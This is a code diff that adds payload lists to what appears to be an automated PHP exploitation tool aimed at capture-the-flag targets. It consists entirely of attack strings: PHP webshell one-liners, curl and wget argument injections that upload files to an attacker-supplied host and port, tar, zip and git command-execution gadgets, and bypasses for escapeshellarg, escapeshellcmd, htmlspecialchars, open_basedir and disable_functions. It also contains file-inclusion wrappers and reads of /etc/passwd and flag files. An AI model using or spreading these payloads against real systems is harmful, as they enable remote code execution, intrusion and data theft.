@@ -272,4 +272,149 @@ WEBSHELL_TEMPLATES = [
     "eval($_GET[x]);&x=system('{cmd}');",
     "assert($_POST[x]);",
     "call_user_func($_GET[x], $_GET[y]);",
+    "$__=array($_GET[y]);call_user_func_array($_GET[x], $__);",
+    "$__=array($_GET[y]);array_map($_GET[x], $__);",
+    "$__=array($_GET[y]);array_filter($__, $_GET[x]);",
+    "preg_replace('/.*/e', $_POST[x], 'x');",
+    "$__=create_function('', $_POST[x]);$__();",
+]
+
+
+
+# AUTO-ONLY ：以下的 payload 只会在 Auto 模式下额外使用
+
+AUTO_ARG_INJECT_BY_CMD = {
+    "file": [
+        "-f{path}",
+        "-r {path}",
+        "-s {path}",
+        "--mime-encoding {path}",
+    ],
+    "curl": [
+        "-o /tmp/f {path}",
+        "-K {path}",
+        "-F file=@{path} http://{ip}:{port}/",
+        "-d @{path} http://{ip}:{port}/",
+        "--upload-file {path} http://{ip}:{port}/",
+    ],
+    "wget": [
+        "--post-file={path} http://{ip}:{port}/",
+        "--output-document=/tmp/f http://{ip}:{port}/",
+    ],
+    "tar": [
+        "-cf /tmp/x {path}",
+        "--to-command=sh -c 'id'",
+        "--checkpoint=1 --checkpoint-action=exec=sh",
+    ],
+    "zip": [
+        "-T -TT 'sh -c id' /tmp/x.zip {path}",
+    ],
+    "git": [
+        "log --output={path} --format=%ae",
+        "--upload-pack='sh -c id;' x",
+    ],
+    "find": [
+        "/ -name flag -exec cat {{}} ;",
+        "{path} -name * -exec cat {{}} ;",
+    ],
+    "ls": [
+        "-la {path}",
+        "-R /",
+        "/f*",
+        "/*lag*",
+    ],
+    "grep": [
+        "-R . {path}",
+        "'' {path}",
+        ". {path}",
+    ],
+    "cat": [
+        "{path}",
+        "/etc/passwd",
+    ],
+}
+
+# 根据 sanitizer 触发。
+AUTO_ESCAPESHELLARG_GADGETS = [
+    "172.17.0.2' -v -d a=1",
+    "x' -F file=@{path} http://{ip}:{port}/ -H 'x: 1",
+]
+
+AUTO_ESCAPESHELLCMD_GADGETS = [
+    "--open-files-in-pager=id",
+    "--pager=id",
+]
+
+AUTO_ADDSLASHES_SAFE = [
+    "`cat {path}`",
+    "`cat$IFS${path}`",
+]
+
+AUTO_HTMLSPECIALCHARS_SAFE = [
+    #  < > & " '
+    "system(current(getallheaders()));",
+    "eval(array_pop(next(get_defined_vars())));",
+    "print_r(scandir(chr(47)));",
+    "readfile(chr(47).chr(102).chr(108).chr(97).chr(103));",
+]
+
+AUTO_PRECISE_EVAL_TEMPLATES = [
+    "eval($_POST['{key}']);",
+    "eval($_GET['{key}']);",
+    "assert($_REQUEST['{key}']);",
+    "system($_POST['{key}']);&{key}=cat {path}",
+    "system($_GET['{key}']);&{key}=cat {path}",
+]
+
+AUTO_PRECISE_INCLUDE_TEMPLATES = [
+    "php://filter/read=convert.base64-encode/resource={path}",
+    "php://filter/convert.iconv.utf-8.utf-16le/resource={path}",
+    "data://text/plain,<?php system('cat {path}');?>",
+    "data://text/plain;base64,{b64}",
+    "php://input",
+    "expect://id",
+    "zip://{path}#shell.php",
+]
+
+AUTO_FILE_READ_PATH_TEMPLATES = [
+    "{path}",
+    "php://filter/read=convert.base64-encode/resource={path}",
+    "php://filter/convert.iconv.utf-8.utf-16le/resource={path}",
+]
+
+
+AUTO_PHP7_ONLY = [
+    "('system')('cat {path}');",
+    "'system'('cat {path}');",
+    "'phpinfo'();",
+    "('phpinfo')();",
+    "(~%8C%86%8C%8B%9A%92)('cat {path}');",
+]
+
+AUTO_OPEN_BASEDIR_BYPASS = [
+    "print_r(glob('/*'));",
+    "foreach(glob('/*') as $f){echo $f.\"\\n\";}",
+    "chdir('..');ini_set('open_basedir','..');chdir('..');chdir('..');"
+    "chdir('..');chdir('..');ini_set('open_basedir','/');"
+    "echo file_get_contents('{path}');",
+    "symlink('{path}','/tmp/bp');echo file_get_contents('/tmp/bp');",
+    "$d=new DirectoryIterator('glob:///*');foreach($d as $f){echo $f.\"\\n\";}",
+]
+
+AUTO_DISABLE_FN_BYPASS = [
+    "putenv('LD_PRELOAD=/tmp/a.so');mail('a','a','a','a');",
+    "pcntl_exec('/bin/sh',['-c','cat {path} > /tmp/o']);readfile('/tmp/o');",
+    "$f=FFI::cdef('int system(const char*);');$f->system('cat {path}');",
+    "new Imagick('vid:msl:/tmp/1.msl');",
+    "error_log('<?php system($_GET[0]);?>',3,'/tmp/x.php');include('/tmp/x.php');",
+]
+
+# base64 编码
+AUTO_BASE64_PREWRAP_TEMPLATES = [
+    "{b64}",
+]
+
+# URL 编码
+AUTO_URLDECODE_PREWRAP_TEMPLATES = [
+    "{urlenc}",
 ]
